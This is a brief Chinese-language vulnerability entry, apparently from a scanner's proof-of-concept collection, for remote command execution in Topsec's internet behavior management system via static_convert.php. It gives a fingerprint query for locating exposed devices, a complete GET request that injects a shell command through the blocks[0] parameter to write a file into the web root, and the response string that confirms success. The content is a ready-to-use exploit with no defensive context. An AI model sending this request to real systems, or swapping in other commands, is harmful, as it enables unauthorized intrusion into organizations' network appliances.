# 天融信上网行为管理系统static_convert远程命令执行漏洞

天融信上网行为管理系统static_convert ｜ 命令执行 ｜ —
- **指纹**：`app="天融信-上网行为管理系统"`
- **请求**：`GET /view/IPV6/naborTable/static_convert.php?blocks[0]=%20%20echo%20'dudesuite'%20>>%20/var/www/html/dudesuite.txt%0A HTTP/1.1`
- **响应特征**：200 dudesuite